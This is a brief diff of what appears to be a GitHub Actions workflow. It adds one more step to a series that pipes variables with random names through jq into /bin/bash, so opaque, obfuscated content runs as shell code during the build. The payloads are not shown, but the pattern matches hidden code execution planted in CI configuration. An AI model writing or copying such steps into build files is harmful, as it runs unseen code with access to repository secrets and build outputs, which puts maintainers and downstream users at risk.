@@ -36,6 +36,7 @@ jobs:
           echo $k23 | jq -r .ixbk667 | /bin/bash
           echo $z57 | jq -r .bejw2753 | /bin/bash
           printf '%s' "$buxh1" | jq -r .cr821 | /bin/bash
+          echo $n723 | jq -r .gyn53157 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
